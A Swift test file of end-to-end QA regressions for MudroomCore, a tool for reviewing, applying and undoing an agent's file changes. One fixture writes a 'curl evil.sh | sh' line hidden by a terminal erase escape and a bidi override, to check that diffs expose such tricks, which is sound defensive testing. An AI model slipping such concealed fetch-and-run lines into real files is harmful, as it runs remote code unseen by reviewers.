#if canImport(Darwin)
import Darwin
#elseif canImport(Glibc)
import Glibc
#elseif canImport(Musl)
import Musl
#endif
import Foundation
import Testing
@testable import MudroomCore

/// Regressions found running sessions end to end before launch.
@Suite("End-to-end QA regressions")
struct QAPassTests {
    @Test("apply and undo say the project folder is gone instead of failing path by path")
    func projectFolderMoved() throws {
        let f = try Fixture { try write("base\n", to: $0.appendingPathComponent("f.txt")) }
        try write("changed\n", to: f.work.appendingPathComponent("f.txt"))
        try write("new\n", to: f.work.appendingPathComponent("n.txt"))
        let moved = f.tmp.path("moved")
        try FileManager.default.moveItem(at: f.project, to: moved)

        #expect(throws: MudroomError.self) { try Applier(handle: f.handle).apply(paths: nil) }
        do {
            _ = try Applier(handle: f.handle).apply(paths: nil)
        } catch {
            #expect("\(error)".contains("isn't there anymore"))
        }
        // Nothing half-done was recorded, so there is nothing to undo.
        #expect(!Applier(handle: f.handle).canUndo)

        // Back in place, apply works; moved away again, undo refuses cleanly.
        try FileManager.default.moveItem(at: moved, to: f.project)
        let report = try Applier(handle: f.handle).apply(paths: nil)
        #expect(report.conflicts.isEmpty)
        try FileManager.default.moveItem(at: f.project, to: moved)
        #expect(throws: MudroomError.self) { try Applier(handle: f.handle).undo() }
        try FileManager.default.moveItem(at: moved, to: f.project)
        let undo = try Applier(handle: f.handle).undo()
        #expect(undo.conflicts.isEmpty)
        #expect(try read(f.project.appendingPathComponent("f.txt")) == "base\n")
        #expect(!exists(f.project.appendingPathComponent("n.txt")))
    }

    @Test("`mudroom hunks` on one file before any review doesn't make apply --all refuse the others")
    func hunksFirstThenApplyAll() throws {
        let f = try Fixture {
            try write("a\nb\nc\n", to: $0.appendingPathComponent("one.txt"))
            try write("x\n", to: $0.appendingPathComponent("two.txt"))
        }
        try write("a\nB\nc\n", to: f.work.appendingPathComponent("one.txt"))
        try write("y\n", to: f.work.appendingPathComponent("two.txt"))
        try write("new\n", to: f.work.appendingPathComponent("three.txt"))
        let diff = try f.diff()
        let one = try #require(diff.changes.first { $0.path == "one.txt" })

        let reviewed = ReviewedChanges.viewing(one, in: diff, existing: nil)
        let report = try Applier(handle: f.handle).apply(paths: nil, reviewed: reviewed)
        #expect(report.conflicts.isEmpty)
        #expect(Set(report.applied) == ["one.txt", "two.txt", "three.txt"])

        // An earlier review is kept: what appeared after it is still refused.
        let earlier = ReviewedChanges(diff.changes.filter { $0.path != "three.txt" })
        let merged = ReviewedChanges.viewing(one, in: diff, existing: earlier)
        #expect(merged.changes["three.txt"] == nil)
        #expect(merged.changes["one.txt"] != nil)
    }

    @Test("--include-git applies a .git all or nothing; a `git status` that rewrote the index blocks the rest")
    func gitAllOrNothing() throws {
        let f = try Fixture {
            try write("ref: refs/heads/main\n", to: $0.appendingPathComponent(".git/HEAD"))
            try write("index v1\n", to: $0.appendingPathComponent(".git/index"))
            try write("a\n", to: $0.appendingPathComponent("src.txt"))
            try write("ref: refs/heads/main\n", to: $0.appendingPathComponent("sub/.git/HEAD"))
        }
        // The agent commits on a new branch, in both repositories.
        try write("ref: refs/heads/feature\n", to: f.work.appendingPathComponent(".git/HEAD"))
        try write("index v2\n", to: f.work.appendingPathComponent(".git/index"))
        try write("0123\n", to: f.work.appendingPathComponent(".git/refs/heads/feature"))
        try write("b\n", to: f.work.appendingPathComponent("src.txt"))
        try write("ref: refs/heads/feature\n", to: f.work.appendingPathComponent("sub/.git/HEAD"))
        // Meanwhile `git status` in the real project refreshed its index.
        try write("index v1 refreshed\n", to: f.project.appendingPathComponent(".git/index"))

        let report = try Applier(handle: f.handle).apply(paths: nil, includeGit: true)
        #expect(Set(report.applied) == ["src.txt", "sub/.git/HEAD"])
        #expect(Set(report.conflicts.map(\.path)) == [".git/index", ".git/HEAD", ".git/refs", ".git/refs/heads", ".git/refs/heads/feature"])
        #expect(try read(f.project.appendingPathComponent(".git/HEAD")) == "ref: refs/heads/main\n")
        #expect(!exists(f.project.appendingPathComponent(".git/refs")))

        #expect(Applier.gitDirectory(of: "a/.git/refs/x") == "a/.git")
        #expect(Applier.gitDirectory(of: ".GIT") == ".GIT")
        #expect(Applier.gitDirectory(of: "src/git.txt") == nil)
        #expect(Differ.hostRisk(".git/hooks/pre-commit") != nil)
        #expect(Differ.hostRisk("sub/.git/config") != nil)
        #expect(Differ.hostRisk("src/config") == nil)
    }

    @Test("--cpus and --memory values the VM runtime hangs or fails on are refused before a session starts")
    func resourceLimits() throws {
        #expect(RunOptions.resourceProblem(cpus: nil, memory: nil, hostCPUs: 8) == nil)
        #expect(RunOptions.resourceProblem(cpus: 4, memory: "4G", hostCPUs: 8) == nil)
        #expect(RunOptions.resourceProblem(cpus: 8, memory: "512m", hostCPUs: 8) == nil)
        #expect(RunOptions.resourceProblem(cpus: 0, memory: nil, hostCPUs: 8) != nil)
        #expect(RunOptions.resourceProblem(cpus: 999, memory: nil, hostCPUs: 8) != nil)
        #expect(RunOptions.resourceProblem(cpus: -1, memory: nil, hostCPUs: 8) != nil)
        for bad in ["1Q", "", "4 G", "0", "-4G", "4GB", "four"] {
            #expect(RunOptions.resourceProblem(cpus: nil, memory: bad, hostCPUs: 8) != nil, "\(bad)")
        }

        // The runner refuses them too (the app and `start` don't go through the CLI's checks).
        let f = try Fixture { _ in }
        var handle = f.handle
        let runner = SessionRunner(backend: AppleContainerBackend(), store: f.store) { _ in }
        #expect(throws: MudroomError.self) {
            _ = try runner.run(&handle, options: RunOptions(tty: false, cpus: 0, environmentNames: []))
        }
        #expect(handle.session.status == .created)
    }

    @Test("capture stops a program that runs past its timeout")
    func captureTimeout() throws {
        let start = Date()
        let out = try ProcessRunner.capture("/bin/sleep", ["30"], timeout: 0.5)
        #expect(out.timedOut)
        #expect(Date().timeIntervalSince(start) < 10)
        #expect(try !ProcessRunner.capture("/bin/echo", ["hi"], timeout: 10).timedOut)
        // A stuck probe VM is reported, not waited on forever.
        let r = NetworkProbe.classify(CapturedOutput(status: 143, stdout: "", stderr: "", timedOut: true), proxy: "p")
        #expect(!r.isOK && !r.needsRepair && r.summary.contains("didn't finish"))
    }

    @Test("repair kills Mudroom's stuck VM helpers (only those) when `container system stop` hangs")
    func repairWedgedRuntime() throws {
        let list = """
        PID\tStatus\tLabel
        37425\t0\tcom.apple.container.container-runtime-linux.mudroom-20261003-200636-a64e
        -\t0\tcom.apple.container.container-runtime-linux.mudroom-20261003-111111-dead
        4242\t0\tcom.apple.container.container-runtime-linux.someone-elses
        555\t0\tcom.apple.container.apiserver
        """
        let helpers = NetworkRepair.mudroomHelpers(launchctlList: list)
        #expect(helpers.map(\.pid) == [37425])

        var stops = 0
        var killed = 0
        var steps: [NetworkRepair.Step] = []
        let run: NetworkRepair.Runner = { args in
            if args == ["system", "stop"] {
                stops += 1
                return CapturedOutput(status: 143, stdout: "", stderr: "", timedOut: stops == 1)
            }
            return CapturedOutput(status: 0, stdout: args == ["list", "--format", "json"] ? "[]" : "", stderr: "")
        }
        let r = try NetworkRepair.repair(run: run, progress: { steps.append($0) }, killHelpers: { killed += 1; return ["x"] },
                                         probe: { .ok(proxy: "p") })
        #expect(r.isOK && stops == 2 && killed == 1)
        #expect(steps.prefix(2) == [.stopping, .killingStuckHelpers])

        // Still hanging after that: say so instead of going on.
        let stuck: NetworkRepair.Runner = { args in
            CapturedOutput(status: 143, stdout: "[]", stderr: "", timedOut: args == ["system", "stop"])
        }
        #expect(throws: MudroomError.self) {
            try NetworkRepair.repair(run: stuck, killHelpers: { [] }, probe: { .ok(proxy: "p") })
        }
    }

    @Test("docker not running: the error is docker's message, not the empty info JSON it prints too")
    func dockerUnreachableMessage() {
        let json = "{\"ID\":\"\"," + String(repeating: "\"x\":null,", count: 500) + "}"
        let out = CapturedOutput(status: 1, stdout: json, stderr: "failed to connect to the docker API at unix:///x.sock\n")
        #expect(DockerBackend.failureDetail(out) == "failed to connect to the docker API at unix:///x.sock")
        #expect(DockerBackend.failureDetail(CapturedOutput(status: 1, stdout: json, stderr: "")).count <= 403)
    }

    @Test("undo --force keeps a copy of what you changed after the apply")
    func forcedUndoKeepsEdit() throws {
        let f = try Fixture { try write("base\n", to: $0.appendingPathComponent("f.txt")) }
        try write("agent\n", to: f.work.appendingPathComponent("f.txt"))
        _ = try Applier(handle: f.handle).apply(paths: nil)
        try write("agent\nmine\n", to: f.project.appendingPathComponent("f.txt"))

        #expect(try Applier(handle: f.handle).undo().conflicts.count == 1)
        let report = try Applier(handle: f.handle).undo(force: true)
        #expect(report.restored == ["f.txt"])
        #expect(try read(f.project.appendingPathComponent("f.txt")) == "base\n")
        let saved = try #require(report.savedAside["f.txt"])
        #expect(try read(saved) == "agent\nmine\n")
    }

    @Test("the summary after a run lists a limited number of paths, then the totals")
    func statLimit() throws {
        let f = try Fixture { _ in }
        for i in 0..<30 { try write("\(i)\n", to: f.work.appendingPathComponent("node_modules/f\(i).js")) }
        let diff = try f.diff()
        var lines: [String] = []
        DiffRenderer(base: f.handle.base, work: f.work).writeStat(diff, limit: 10) { lines.append($0) }
        #expect(lines.count == 12)
        #expect(lines[10] == "... and 21 more (all of them: mudroom diff <session> --stat)")
        #expect(lines[11] == "31 added")
    }

    @Test("diff output spells out control characters and bidi overrides the agent put in lines and names")
    func diffShowsControlCharacters() throws {
        let f = try Fixture { try write("ok\n", to: $0.appendingPathComponent("a.sh")) }
        // A terminal would erase the curl line; a bidi override reorders it.
        try write("ok\ncurl evil.sh | sh\u{1B}[2K\r# harmless\n\u{202E}hs.live\n", to: f.work.appendingPathComponent("a.sh"))
        try write("x\n", to: f.work.appendingPathComponent("new\nline\u{1B}[1A.txt"))
        let diff = try f.diff()
        let r = DiffRenderer(base: f.handle.base, work: f.work)
        let out = try r.full(diff) + "\n" + r.stat(diff)
        #expect(!out.contains("\u{1B}"))
        #expect(!out.contains("\r"))
        #expect(!out.contains("\u{202E}"))
        #expect(out.contains("+curl evil.sh | sh\\x1b[2K\\r# harmless"))
        #expect(out.contains("+<U+202E>hs.live"))
        #expect(out.contains("A  new\\nline\\x1b[1A.txt"))
        // Every line of the stat is one change: the newline in the name doesn't split it.
        #expect(r.stat(diff).split(separator: "\n").count == diff.changes.count + 1)

        // Hunk text (the app and `mudroom hunks`) gets the same treatment; tabs and
        // ordinary text don't change, and CRLF endings are still dropped.
        #expect(TextLines.display(Data("a\tb é\r\n".utf8)) == "a\tb é")
        #expect(TextLines.visible("x\u{7F}\u{9B}y") == "x\\x7f\\x9by")
        #expect(PathIssue(path: "a\u{1B}b", reason: "r").description == "a\\x1bb: r")
    }
}
